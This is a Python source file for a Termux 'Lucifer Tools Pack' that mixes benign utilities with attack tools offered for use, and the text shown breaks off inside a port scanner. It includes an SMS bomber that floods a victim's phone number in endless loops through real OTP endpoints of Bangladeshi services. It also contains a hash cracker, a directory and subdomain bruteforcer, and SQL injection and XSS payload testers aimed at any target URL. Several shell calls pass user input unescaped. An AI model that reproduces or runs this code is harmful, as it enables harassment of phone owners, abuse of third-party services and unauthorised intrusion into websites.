#!/usr/bin/env python3
import os
import sys
import time
import hashlib
import requests
import socket
import threading
import random
import re
import itertools
import string
import urllib.parse
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup

# Color codes
GREEN = "\033[1;32m"
RED = "\033[1;31m"
CYAN = "\033[1;36m"
YELLOW = "\033[1;33m"
RESET = "\033[0m"

# Password Configuration - HIDDEN
PASSWORD_HASH = "7797b4237da3248b8b85feb361ea661afc2d34f272e596197c217c9318521949"
MAX_ATTEMPTS = 3


def check_password():
    """Password verification system - completely hidden"""
    attempts = 0

    while attempts < MAX_ATTEMPTS:
        print(f"{CYAN}\n╔══════════════════════════════════════╗")
        print(f"║           LUCIFER TOOLS ACCESS          ║")
        print(f"╚══════════════════════════════════════╝{RESET}")
        print(f"{YELLOW}[!] This tool is password protected{RESET}")

        # Simple hidden input
        entered_password = input(f"{CYAN}[?] Enter Password: {RESET}")

        # Verify with hash only - no plain text
        entered_hash = hashlib.sha256(entered_password.encode()).hexdigest()

        if entered_hash == PASSWORD_HASH:
            print(f"{GREEN}[+] Access Granted! Loading tools...{RESET}")
            time.sleep(1)
            return True
        else:
            attempts += 1
            remaining = MAX_ATTEMPTS - attempts
            print(f"{RED}[-] Incorrect Password! {remaining} attempts remaining{RESET}")
            time.sleep(1)

    print(f"{RED}[!] Maximum attempts reached. Exiting...{RESET}")
    return False


def clear():
    os.system("cls" if os.name == "nt" else "clear")


def banner():
    print(f"""
{RED}██╗     ██╗   ██╗ ██████╗██╗███████╗███████╗██████╗ 
██║     ██║   ██║██╔════╝██║██╔════╝██╔════╝██╔══██╗
██║     ██║   ██║██║     ██║█████╗  █████╗  ██████╔╝
██║     ██║   ██║██║     ██║██╔══╝  ██╔══╝  ██╔══██╗
███████╗╚██████╔╝╚██████╗██║██║     ███████╗██║  ██║
╚══════╝ ╚═════╝  ╚═════╝╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝{RESET}
        {GREEN}Lucifer Termux Tools Pack{RESET}
            Developed by Foysal...
""")


# ----------------------------- #
# 1. Network Scanner (ARP)
# ----------------------------- #
def arp_scan():
    os.system("pkg install net-tools -y >/dev/null 2>&1")
    print(GREEN + "\nScanning local devices...\n" + RESET)
    os.system("arp -a")


# ----------------------------- #
# 2. IP Info Lookup
# ----------------------------- #
def ip_lookup():
    ip = input("\nEnter IP or Domain: ")
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}", timeout=10).json()
        print("\n")
        for k, v in r.items():
            print(f"{k} : {v}")
    except:
        print(RED + "Error fetching info!" + RESET)


# ----------------------------- #
# 3. Port Scanner
# ----------------------------- #
def port_scan():
    target = input("\nTarget IP: ")
    ports = [21, 22, 23, 53, 80, 443, 8080]
    print("\nScanning common ports...\n")
    for port in ports:
        s = socket.socket()
        s.settimeout(0.5)
        try:
            s.connect((target, port))
            print(GREEN + f"[OPEN] Port {port}" + RESET)
        except:
            print(RED + f"[CLOSED] Port {port}" + RESET)


# ----------------------------- #
# 4. System Information
# ----------------------------- #
def system_info():
    print("\n")
    os.system("uname -a 2>/dev/null || ver")
    os.system("termux-info 2>/dev/null || echo 'Termux not detected'")


# ----------------------------- #
# 5. File Search
# ----------------------------- #
def file_search():
    name = input("\nEnter filename: ")
    print("\nSearching...\n")
    if os.name == 'nt':
        os.system(f'dir /s /b *{name}* 2>nul')
    else:
        os.system(f"find $HOME -iname '*{name}*' 2>/dev/null")


# ----------------------------- #
# 6. Wordlist Generator
# ----------------------------- #
def wordlist():
    word = input("\nBase word: ")
    count = int(input("How many? "))
    file = open("wordlist.txt", "w")
    for i in range(count):
        file.write(f"{word}{i}\n")
    file.close()
    print(GREEN + "\nWordlist saved as wordlist.txt" + RESET)


# ----------------------------- #
# 7. Password Strength Checker
# ----------------------------- #
def pass_strength():
    ps = input("\nEnter Password: ")
    strength = 0
    if len(ps) >= 8: strength += 1
    if any(c.isdigit() for c in ps): strength += 1
    if any(c.isalpha() for c in ps): strength += 1
    if any(c in "!@#$%^&*()_+" for c in ps): strength += 1

    levels = ["VERY WEAK", "WEAK", "MEDIUM", "STRONG"]
    print(GREEN + f"\nPassword Strength: {levels[strength]}\n" + RESET)


# ----------------------------- #
# 8. Website Status Checker
# ----------------------------- #
def web_status():
    url = input("\nEnter website URL: ")
    try:
        r = requests.get(url, timeout=10)
        print(GREEN + f"\nStatus: {r.status_code} (OK)\n" + RESET)
    except:
        print(RED + "\nWebsite unreachable!\n" + RESET)


# ----------------------------- #
# 9. Storage Usage
# ----------------------------- #
def storage():
    if os.name == 'nt':
        os.system("dir /s /q | find \"File(s)\"")
    else:
        os.system("du -h ~ | tail -5")


# ----------------------------- #
# 10. Internet Speed Test
# ----------------------------- #
def speed_test():
    try:
        os.system("pip install speedtest-cli -q")
        os.system("speedtest-cli --simple")
    except:
        print(RED + "Speed test failed!" + RESET)


# ----------------------------- #
# 11. Hash Generator
# ----------------------------- #
def hash_generate():
    text = input("\nEnter text: ")
    print("\nMD5:", hashlib.md5(text.encode()).hexdigest())
    print("SHA256:", hashlib.sha256(text.encode()).hexdigest())


# ----------------------------- #
# 12. YouTube Info Grabber
# ----------------------------- #
def yt_info():
    try:
        os.system("pip install yt-dlp -q")
        url = input("\nEnter YouTube URL: ")
        os.system(f"yt-dlp --get-title --get-duration {url}")
    except:
        print(RED + "YouTube info failed!" + RESET)


# ----------------------------- #
# 13. Strong Password Generator
# ----------------------------- #
def strong_pass():
    length = int(input("\nPassword Length: "))
    chars = string.ascii_letters + string.digits + "!@#$%^&*()_+="
    password = "".join(random.choice(chars) for _ in range(length))
    print(GREEN + f"\nGenerated Password: {password}\n" + RESET)


# ----------------------------- #
# 14. URL Shortener
# ----------------------------- #
def url_shortener():
    long_url = input("\nEnter Long URL: ")
    try:
        api = f"http://tinyurl.com/api-create.php?url={long_url}"
        short = requests.get(api, timeout=10).text
        print(GREEN + f"\nShort URL: {short}\n" + RESET)
    except:
        print(RED + "\nFailed to shorten URL\n" + RESET)


# ----------------------------- #
# 15. Battery Status (Termux API)
# ----------------------------- #
def battery_status():
    if os.name != 'nt':
        os.system("termux-battery-status")
    else:
        print(RED + "Windows not supported" + RESET)


# ----------------------------- #
# 16. Send SMS (Your Phone)
# ----------------------------- #
def sms_sender():
    if os.name != 'nt':
        os.system("pkg install termux-api -y >/dev/null 2>&1")
        number = input("\nEnter number: ")
        msg = input("Message: ")
        os.system(f"termux-sms-send -n {number} '{msg}'")
        print(GREEN + "\nSMS Sent!\n" + RESET)
    else:
        print(RED + "Windows not supported" + RESET)


# ----------------------------- #
# 17. Camera Snap
# ----------------------------- #
def camera_snap():
    if os.name != 'nt':
        os.system("termux-camera-photo ~/photo.jpg 2>/dev/null")
        print(GREEN + "\nSaved: ~/photo.jpg\n" + RESET)
    else:
        print(RED + "Windows not supported" + RESET)


# ----------------------------- #
# 18. Text to PDF
# ----------------------------- #
def text_to_pdf():
    try:
        os.system("pip install fpdf -q")
        from fpdf import FPDF
        text = input("\nWrite text for PDF: ")
        pdf = FPDF()
        pdf.add_page()
        pdf.set_font("Arial", size=12)
        pdf.multi_cell(0, 10, text)
        pdf.output("output.pdf")
        print(GREEN + "\nPDF saved as output.pdf\n" + RESET)
    except:
        print(RED + "\nPDF creation failed!\n" + RESET)


# ----------------------------- #
# 19. Temp Mail
# ----------------------------- #
def temp_mail():
    try:
        domains = requests.get("https://api.mail.tm/domains", timeout=10).json()
        dom = domains["hydra:member"][0]["domain"]
        print(GREEN + f"\nTemp Mail Domain: @{dom}\n" + RESET)
    except:
        print(RED + "\nCould not fetch temporary email.\n" + RESET)


# ----------------------------- #
# 20. PDF to Text
# ----------------------------- #
def pdf_to_text():
    try:
        os.system("pip install PyPDF2 -q")
        from PyPDF2 import PdfReader
        file = input("\nPDF File Path: ")
        pdf = PdfReader(file)
        print("\nExtracted Text:\n")
        for page in pdf.pages:
            print(page.extract_text())
    except:
        print(RED + "\nError reading PDF!\n" + RESET)


# ----------------------------- #
# 21. Clipboard Tools
# ----------------------------- #
def clipboard_tools():
    if os.name != 'nt':
        os.system("pkg install termux-api -y >/dev/null 2>&1")
        print("\n1. Copy to clipboard")
        print("2. Read clipboard")
        choice = input("\nChoose: ")
        if choice == "1":
            txt = input("Enter text: ")
            os.system(f"termux-clipboard-set '{txt}'")
        elif choice == "2":
            os.system("termux-clipboard-get")
    else:
        print(RED + "Windows not supported" + RESET)


# ----------------------------- #
# 22. Random MAC Generator
# ----------------------------- #
def mac_gen():
    mac = [random.randint(0x00, 0xFF) for _ in range(6)]
    mac_addr = ':'.join(f"{x:02x}" for x in mac)
    print(GREEN + f"\nRandom MAC: {mac_addr}\n" + RESET)


# ----------------------------- #
# 23. Lucifer SMS Bomber
# ----------------------------- #
def Lucifer_Bomber():
    try:
        PASSWORD = "Lucifer@143"

        def banner():
            os.system("cls" if os.name == "nt" else "clear")
            print(f"""{RED}
        ██╗     ██╗   ██╗ ██████╗██╗███████╗███████╗██████╗ 
        ██║     ██║   ██║██╔════╝██║██╔════╝██╔════╝██╔══██╗
        ██║     ██║   ██║██║     ██║█████╗  █████╗  ██████╔╝
        ██║     ██║   ██║██║     ██║██╔══╝  ██╔══╝  ██╔══██╗
        ███████╗╚██████╔╝╚██████╗██║██║     ███████╗██║  ██║
        ╚══════╝ ╚═════╝  ╚═════╝╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝
        {RESET}{GREEN}
                 LUCIFER BD SMS BOMBER v2.0
                   Developed by Foysal...
        {RESET}""")

        def password_prompt():
            print("\033[1;31m[!] This tool is password protected.\033[0m")
            pw = input("Enter password: ")
            if pw != PASSWORD:
                print("\033[1;31m[-] Incorrect Password. Exiting...\033[0m")
                return False
            print("\033[1;32m[+] Access Granted!\033[0m")
            time.sleep(1)
            return True

        def bomber_menu():
            print("\n\033[1;36m[1] Start SMS Bombing\n[2] Exit\033[0m")
            choice = input("Select an option: ")
            return choice

        def get_target():
            number = input("Enter target number (01XXXXXXXXX): ")
            if number.startswith("01") and len(number) == 11:
                return number, "880" + number[1:]
            else:
                print("Invalid number format.")
                return None, None

        counter = 0
        lock = threading.Lock()

        def update_counter():
            nonlocal counter
            with lock:
                counter += 1
                print(f"\033[1;32m[+] SMS Sent: {counter}\033[0m")

        def fast_apis(phone, full):
            try:
                requests.get(f"https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn={full}&lang=en&ng=0",
                             timeout=5)
                update_counter()
            except:
                pass

            try:
                requests.get(f"https://fundesh.com.bd/api/auth/generateOTP?service_key=&phone={phone}", timeout=5)
                update_counter()
            except:
                pass

        def normal_apis(phone, full):
            apis = [
                ("https://webloginda.grameenphone.com/backend/api/v1/otp", {"msisdn": full}),
                ("https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php",
                 {"phone": phone}),
                ("https://api.osudpotro.com/api/v1/users/send_otp", {"phone": phone}),
                ("https://api.apex4u.com/api/auth/login", {"phone": phone}),
                ("https://bb-api.bohubrihi.com/public/activity/otp", {"phone": phone}),
                ("https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", {"mobile": phone}),
                ("https://training.gov.bd/backoffice/api/user/sendOtp", {"phone": phone}),
                ("https://da-api.robi.com.bd/da-nll/otp/send", {"msisdn": full}),
            ]

            for url, data in apis:
                try:
                    requests.post(url, json=data, timeout=5)
                    update_counter()
                except:
                    pass

        def start_bombing():
            phone, full = get_target()
            if phone is None:
                return

            print(f"\n{GREEN}[+] Starting SMS Bombing on {phone}{RESET}")
            print(f"{YELLOW}[!] Press Ctrl+C to stop{RESET}\n")

            try:
                while True:
                    threads = []

                    for _ in range(3):
                        t = threading.Thread(target=fast_apis, args=(phone, full))
                        t.daemon = True
                        t.start()
                        threads.append(t)

                    t = threading.Thread(target=normal_apis, args=(phone, full))
                    t.daemon = True
                    t.start()
                    threads.append(t)

                    for t in threads:
                        t.join(timeout=10)
                    time.sleep(1)

            except KeyboardInterrupt:
                print(f"\n{RED}[!] SMS Bombing stopped by user.{RESET}")
                print(f"{GREEN}[+] Total SMS sent: {counter}{RESET}")

        # Main bomber execution
        banner()
        if not password_prompt():
            return

        while True:
            choice = bomber_menu()
            if choice == "1":
                start_bombing()
                break
            elif choice == "2":
                print(f"{RED}[+] Returning to main menu...{RESET}")
                break
            else:
                print(f"{RED}[-] Invalid option!{RESET}")

    except Exception as e:
        print(f"{RED}\nBomber Failed: {str(e)}{RESET}")
        print(f"{YELLOW}Returning to main menu...{RESET}")


# ----------------------------- #
# 24. Password Tools
# ----------------------------- #
def password_tools():
    class PasswordTools:
        def __init__(self):
            self.found_password = None
            self.attempts = 0
            self.start_time = 0

        def banner(self):
            print(f"""
{CYAN}╔══════════════════════════════════════╗
║           PASSWORD TOOLS            ║
║           [Termux Edition]          ║
╚══════════════════════════════════════╝{RESET}
            """)

        def show_menu(self):
            print(f"\n{CYAN}[1]{RESET} Hash Cracker")
            print(f"{CYAN}[2]{RESET} Password Generator")
            print(f"{CYAN}[3]{RESET} Hash Generator")
            print(f"{CYAN}[4]{RESET} Password Strength Checker")
            print(f"{CYAN}[5]{RESET} Wordlist Generator")
            print(f"{CYAN}[0]{RESET} Back to Main Menu")

        def identify_hash(self, hash_string):
            hash_length = len(hash_string)
            hash_types = {
                32: "MD5",
                40: "SHA1",
                56: "SHA224",
                64: "SHA256",
                96: "SHA384",
                128: "SHA512"
            }
            return hash_types.get(hash_length, "Unknown")

        def generate_hash(self, password, hash_type):
            hash_type = hash_type.upper()
            if hash_type == "MD5":
                return hashlib.md5(password.encode()).hexdigest()
            elif hash_type == "SHA1":
                return hashlib.sha1(password.encode()).hexdigest()
            elif hash_type == "SHA256":
                return hashlib.sha256(password.encode()).hexdigest()
            elif hash_type == "SHA224":
                return hashlib.sha224(password.encode()).hexdigest()
            elif hash_type == "SHA384":
                return hashlib.sha384(password.encode()).hexdigest()
            elif hash_type == "SHA512":
                return hashlib.sha512(password.encode()).hexdigest()
            else:
                return None

        def crack_hash(self):
            print(f"\n{CYAN}[=== HASH CRACKER ===]{RESET}")
            target_hash = input("[?] Enter target hash: ").strip()
            hash_type = input("[?] Enter hash type (md5/sha1/sha256/auto): ").strip().lower()
            wordlist_path = input("[?] Enter wordlist path: ").strip()

            if hash_type == "auto":
                hash_type = self.identify_hash(target_hash)
                print(f"{GREEN}[*] Identified hash type: {hash_type}{RESET}")

            if not hash_type:
                print(f"{RED}[-] Could not identify hash type{RESET}")
                return

            threads = input("[?] Enter threads (default 4): ").strip()
            threads = int(threads) if threads.isdigit() else 4

            self.found_password = None
            self.attempts = 0
            self.start_time = time.time()

            print(f"\n{GREEN}[*] Cracking hash: {target_hash}{RESET}")
            print(f"{GREEN}[*] Hash type: {hash_type}{RESET}")
            print(f"{GREEN}[*] Using {threads} threads...{RESET}")

            try:
                with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                    passwords = [line.strip() for line in f if line.strip()]
            except FileNotFoundError:
                print(f"{RED}[-] Wordlist not found: {wordlist_path}{RESET}")
                return

            def check_password(password):
                if self.found_password:
                    return

                self.attempts += 1
                hashed = self.generate_hash(password, hash_type)

                if hashed == target_hash:
                    self.found_password = password
                    return True

                if self.attempts % 1000 == 0:
                    print(f"{YELLOW}[*] Attempts: {self.attempts} | Current: {password[:20]}...{RESET}", end='\r')

                return False

            with ThreadPoolExecutor(max_workers=threads) as executor:
                list(executor.map(check_password, passwords))

            if self.found_password:
                print(f"\n{GREEN}[+] PASSWORD FOUND: {self.found_password}{RESET}")
            else:
                print(f"\n{RED}[-] Password not found{RESET}")

            print(f"{YELLOW}[*] Total attempts: {self.attempts}{RESET}")
            print(f"{YELLOW}[*] Time: {time.time() - self.start_time:.2f}s{RESET}")

        def generate_passwords(self):
            print(f"\n{CYAN}[=== PASSWORD GENERATOR ===]{RESET}")
            min_len = int(input("[?] Minimum length: "))
            max_len = int(input("[?] Maximum length: "))
            use_digits = input("[?] Use digits? (y/n): ").lower() == 'y'
            use_special = input("[?] Use special chars? (y/n): ").lower() == 'y'
            output_file = input("[?] Output file: ")

            chars = string.ascii_lowercase
            if use_digits:
                chars += string.digits
            if use_special:
                chars += "!@#$%^&*"

            count = 0
            with open(output_file, 'w') as f:
                for length in range(min_len, max_len + 1):
                    for combo in itertools.product(chars, repeat=length):
                        password = ''.join(combo)
                        f.write(password + '\n')
                        count += 1
                        if count % 1000 == 0:
                            print(f"{YELLOW}[*] Generated: {count} passwords{RESET}", end='\r')

            print(f"\n{GREEN}[+] Generated {count} passwords in {output_file}{RESET}")

        def generate_hashes(self):
            print(f"\n{CYAN}[=== HASH GENERATOR ===]{RESET}")
            text = input("[?] Enter text to hash: ")
            hash_type = input("[?] Enter hash type (md5/sha1/sha256): ").strip().lower()

            hashed = self.generate_hash(text, hash_type)
            if hashed:
                print(f"\n{GREEN}[+] {hash_type.upper()} hash: {hashed}{RESET}")
            else:
                print(f"{RED}[-] Invalid hash type{RESET}")

        def check_strength(self):
            print(f"\n{CYAN}[=== PASSWORD STRENGTH CHECKER ===]{RESET}")
            password = input("[?] Enter password to check: ")

            score = 0
            feedback = []

            if len(password) >= 8:
                score += 1
            else:
                feedback.append("❌ Too short (min 8 chars)")

            if any(char.isdigit() for char in password):
                score += 1
            else:
                feedback.append("❌ Add digits")

            if any(char.isupper() for char in password) and any(char.islower() for char in password):
                score += 1
            else:
                feedback.append("❌ Use both upper & lower case")

            if any(char in "!@#$%^&*" for char in password):
                score += 1
            else:
                feedback.append("❌ Add special characters")

            if score == 4:
                rating = f"{GREEN}💪 STRONG{RESET}"
            elif score == 3:
                rating = f"{YELLOW}👍 MEDIUM{RESET}"
            else:
                rating = f"{RED}👎 WEAK{RESET}"

            print(f"\nPassword: {password}")
            print(f"Length: {len(password)}")
            print(f"Strength: {rating} ({score}/4)")

            if feedback:
                print(f"\n{YELLOW}Improvements:{RESET}")
                for item in feedback:
                    print(f"  {item}")

        def generate_wordlist(self):
            print(f"\n{CYAN}[=== WORDLIST GENERATOR ===]{RESET}")
            base_words = input("[?] Enter base words (comma separated): ").split(',')
            output_file = input("[?] Output file: ")

            count = 0
            with open(output_file, 'w') as f:
                for word in base_words:
                    word = word.strip()
                    if word:
                        f.write(word + '\n')
                        count += 1

                for word in base_words:
                    word = word.strip()
                    if not word:
                        continue

                    variations = []
                    variations.append(word.upper())
                    variations.append(word.lower())
                    variations.append(word.capitalize())

                    for i in range(100):
                        variations.append(word + str(i))
                        variations.append(str(i) + word)

                    for var in variations:
                        if var and var not in base_words:
                            f.write(var + '\n')
                            count += 1

            print(f"{GREEN}[+] Generated {count} words in {output_file}{RESET}")

        def main(self):
            self.banner()

            while True:
                self.show_menu()
                choice = input(f"\n{YELLOW}[?] Select option: {RESET}")

                if choice == '1':
                    self.crack_hash()
                elif choice == '2':
                    self.generate_passwords()
                elif choice == '3':
                    self.generate_hashes()
                elif choice == '4':
                    self.check_strength()
                elif choice == '5':
                    self.generate_wordlist()
                elif choice == '0':
                    print(f"\n{GREEN}[+] Returning to main menu...{RESET}")
                    break
                else:
                    print(f"{RED}[-] Invalid choice{RESET}")

                input(f"\n{YELLOW}Press Enter to continue...{RESET}")

    tool = PasswordTools()
    tool.main()


# ----------------------------- #
# 25. Web Hacking Tools
# ----------------------------- #
def web_hacking_tools():
    class WebHackingTools:
        def __init__(self):
            self.session = requests.Session()
            self.results = []
            self.user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
            ]

        def banner(self):
            print(f"""
{CYAN}╔══════════════════════════════════════╗
║           WEB HACKING TOOLS         ║
║           [Lucifer Edition]         ║
╚══════════════════════════════════════╝{RESET}
            """)

        def show_menu(self):
            print(f"\n{CYAN}[1]{RESET} Directory Bruteforcer")
            print(f"{CYAN}[2]{RESET} Subdomain Scanner")
            print(f"{CYAN}[3]{RESET} SQL Injection Tester")
            print(f"{CYAN}[4]{RESET} XSS Vulnerability Scanner")
            print(f"{CYAN}[5]{RESET} Port Scanner")
            print(f"{CYAN}[6]{RESET} Website Information Gatherer")
            print(f"{CYAN}[7]{RESET} Admin Panel Finder")
            print(f"{CYAN}[8]{RESET} Crawler & Link Extractor")
            print(f"{CYAN}[9]{RESET} Header Security Analyzer")
            print(f"{CYAN}[0]{RESET} Back to Main Menu")

        def get_headers(self):
            return {
                'User-Agent': random.choice(self.user_agents),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
            }

        def directory_bruteforce(self):
            print(f"\n{CYAN}[=== DIRECTORY BRUTEFORCER ===]{RESET}")
            url = input("[?] Enter target URL: ").strip()
            wordlist_path = input("[?] Enter wordlist path: ").strip()
            threads = input("[?] Enter threads (default 10): ").strip()
            threads = int(threads) if threads.isdigit() else 10

            if not url.startswith(('http://', 'https://')):
                url = 'http://' + url
            url = url.rstrip('/')

            print(f"\n{GREEN}[*] Target: {url}{RESET}")
            print(f"{GREEN}[*] Wordlist: {wordlist_path}{RESET}")
            print(f"{GREEN}[*] Threads: {threads}{RESET}")
            print(f"{YELLOW}[*] Scanning started...{RESET}\n")

            try:
                with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                    directories = [line.strip() for line in f if line.strip()]
            except FileNotFoundError:
                print(f"{RED}[-] Wordlist not found: {wordlist_path}{RESET}")
                return
            except Exception as e:
                print(f"{RED}[-] Error reading wordlist: {e}{RESET}")
                return

            found_dirs = []
            lock = threading.Lock()

            def check_directory(directory):
                try:
                    test_url = f"{url}/{directory}"
                    headers = self.get_headers()
                    response = self.session.get(test_url, headers=headers, timeout=8, allow_redirects=False)

                    if response.status_code == 200:
                        with lock:
                            found_dirs.append((test_url, response.status_code, len(response.content)))
                        print(f"{GREEN}[+] FOUND [{response.status_code}]: {test_url} ({len(response.content)} bytes){RESET}")
                    elif response.status_code in [301, 302, 307, 308]:
                        location = response.headers.get('Location', 'Unknown')
                        print(f"{YELLOW}[!] REDIRECT [{response.status_code}]: {test_url} -> {location}{RESET}")
                    elif response.status_code == 403:
                        print(f"{RED}[-] FORBIDDEN [{response.status_code}]: {test_url}{RESET}")
                    elif response.status_code == 401:
                        print(f"{YELLOW}[!] UNAUTHORIZED [{response.status_code}]: {test_url}{RESET}")

                except requests.exceptions.Timeout:
                    print(f"{RED}[-] TIMEOUT: {directory}{RESET}")
                except Exception:
                    pass

            start_time = time.time()

            try:
                with ThreadPoolExecutor(max_workers=threads) as executor:
                    chunk_size = 100
                    for i in range(0, len(directories), chunk_size):
                        chunk = directories[i:i + chunk_size]
                        executor.map(check_directory, chunk)
            except KeyboardInterrupt:
                print(f"\n{YELLOW}[!] Scan interrupted by user{RESET}")

            total_time = time.time() - start_time
            print(f"\n{YELLOW}[*] Scan completed in {total_time:.2f}s{RESET}")
            print(f"{GREEN}[*] Found {len(found_dirs)} accessible directories{RESET}")

            if found_dirs:
                print(f"\n{GREEN}[+] Found directories:{RESET}")
                for url, status, size in found_dirs[:20]:
                    print(f"  - {url} ({status}, {size} bytes)")

        def subdomain_scanner(self):
            print(f"\n{CYAN}[=== SUBDOMAIN SCANNER ===]{RESET}")
            domain = input("[?] Enter target domain (without http://): ").strip()
            wordlist_path = input("[?] Enter subdomain wordlist path: ").strip()
            threads = input("[?] Enter threads (default 10): ").strip()
            threads = int(threads) if threads.isdigit() else 10

            print(f"\n{GREEN}[*] Target: {domain}{RESET}")
            print(f"{GREEN}[*] Wordlist: {wordlist_path}{RESET}")
            print(f"{YELLOW}[*] Scanning subdomains...{RESET}\n")

            try:
                with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                    subdomains = [line.strip() for line in f if line.strip()]
            except FileNotFoundError:
                print(f"{RED}[-] Wordlist not found: {wordlist_path}{RESET}")
                return

            found_subs = []
            lock = threading.Lock()

            def check_subdomain(subdomain):
                try:
                    full_domain = f"{subdomain}.{domain}"
                    url = f"http://{full_domain}"
                    response = self.session.get(url, headers=self.get_headers(), timeout=5, allow_redirects=False)

                    if response.status_code in [200, 301, 302, 403, 401]:
                        with lock:
                            found_subs.append((full_domain, response.status_code))
                        print(f"{GREEN}[+] FOUND [{response.status_code}]: {full_domain}{RESET}")

                except:
                    pass

            start_time = time.time()

            try:
                with ThreadPoolExecutor(max_workers=threads) as executor:
                    executor.map(check_subdomain, subdomains)
            except KeyboardInterrupt:
                print(f"\n{YELLOW}[!] Scan interrupted by user{RESET}")

            total_time = time.time() - start_time
            print(f"\n{GREEN}[*] Found {len(found_subs)} subdomains in {total_time:.2f}s{RESET}")

            if found_subs:
                print(f"\n{GREEN}[+] Found subdomains:{RESET}")
                for domain, status in found_subs:
                    print(f"  - {domain} ({status})")

        def sql_injection_test(self):
            print(f"\n{CYAN}[=== SQL INJECTION TESTER ===]{RESET}")
            url = input("[?] Enter target URL (with parameters): ").strip()

            if not url.startswith(('http://', 'https://')):
                url = 'http://' + url

            payloads = [
                "'",
                "';",
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT 1,2,3--",
                "' AND 1=1--",
                "' AND 1=2--",
            ]

            print(f"\n{GREEN}[*] Testing URL: {url}{RESET}")
            print(f"{YELLOW}[*] Sending SQL injection payloads...{RESET}\n")

            vulnerable = False
            found_payloads = []

            for payload in payloads:
                try:
                    parsed_url = urlparse(url)
                    query_params = parse_qs(parsed_url.query)

                    if query_params:
                        for param in query_params:
                            test_params = query_params.copy()
                            test_params[param] = payload
                            new_query = urlencode(test_params, doseq=True)
                            test_url = urlunparse((
                                parsed_url.scheme,
                                parsed_url.netloc,
                                parsed_url.path,
                                parsed_url.params,
                                new_query,
                                parsed_url.fragment
                            ))

                            response = self.session.get(test_url, headers=self.get_headers(), timeout=10)

                            error_indicators = [
                                "mysql_fetch_array", "mysql_num_rows", "mysql error",
                                "ORA-", "Microsoft OLE DB", "SQLServer JDBC Driver",
                                "PostgreSQL", "SQLite", "SQL syntax", "syntax error",
                            ]

                            for error in error_indicators:
                                if error.lower() in response.text.lower():
                                    print(f"{RED}[!] SQL Injection found in parameter '{param}' with payload: {payload}{RESET}")
                                    vulnerable = True
                                    found_payloads.append((param, payload))
                                    break

                except Exception as e:
                    print(f"{RED}[-] Error testing payload: {payload} - {e}{RESET}")

            if not vulnerable:
                print(f"{GREEN}[-] No SQL injection vulnerabilities found{RESET}")
            else:
                print(f"\n{RED}[!] Website is vulnerable to SQL Injection!{RESET}")
                print(f"{YELLOW}[!] Vulnerable parameters:{RESET}")
                for param, payload in found_payloads:
                    print(f"  - {param}: {payload}")

        def xss_scanner(self):
            print(f"\n{CYAN}[=== XSS VULNERABILITY SCANNER ===]{RESET}")
            url = input("[?] Enter target URL (with parameters): ").strip()

            if not url.startswith(('http://', 'https://')):
                url = 'http://' + url

            xss_payloads = [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "'><script>alert('XSS')</script>",
            ]

            print(f"\n{GREEN}[*] Testing URL: {url}{RESET}")
            print(f"{YELLOW}[*] Sending XSS payloads...{RESET}\n")

            vulnerable = False
            found_payloads = []

            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)

            if not query_params:
                print(f"{RED}[-] No parameters found in URL{RESET}")
                return

            for payload in xss_payloads:
                try:
                    for param in query_params:
                        test_params = query_params.copy()
                        test_params[param] = payload
                        new_query = urlencode(test_params, doseq=True)
                        test_url = urlunparse((
                            parsed_url.scheme,
                            parsed_url.netloc,
                            parsed_url.path,
                            parsed_url.params,
                            new_query,
                            parsed_url.fragment
                        ))

                        response = self.session.get(test_url, headers=self.get_headers(), timeout=10)

                        if payload in response.text:
                            encoded_payload = payload.replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;')
                            if encoded_payload not in response.text:
                                print(f"{RED}[!] XSS found in parameter '{param}' with payload: {payload}{RESET}")
                                vulnerable = True
                                found_payloads.append((param, payload))

                except Exception as e:
                    print(f"{RED}[-] Error testing XSS payload: {e}{RESET}")

            if not vulnerable:
                print(f"{GREEN}[-] No XSS vulnerabilities found{RESET}")
            else:
                print(f"\n{RED}[!] Website is vulnerable to XSS!{RESET}")
                print(f"{YELLOW}[!] Vulnerable parameters:{RESET}")
                for param, payload in found_payloads:
                    print(f"  - {param}: {payload}")

        def port_scanner(self):
            print(f"\n{CYAN}[=== PORT SCANNER ===]{RESET}")
            target = input("[?] Enter target IP/hostname: ").strip()

            try:
                start_port = int(input("[?] Start port (default 1): ") or "1")
                end_port = int(input("[?] End port (default 1000): ") or "1000")
            except ValueError:
                print(f"{RED}[-] Invalid port number{RESET}")
                return

            threads = input("[?] Enter threads (default 50): ").strip()
            threads = int(threads) if threads.isdigit() else 50

            common_ports = [21, 22, 23, 25, 53, 80, 110, 443, 993, 995, 8080, 8443]

            print(f"\n{GREEN}[*] Scanning {target} from port {start_port} to {end_port}{RESET}")
            print(f"{YELLOW}[*] Scanning started...{RESET}\n")

            open_ports = []
            lock = threading.Lock()

            def scan_port(port):
                try:
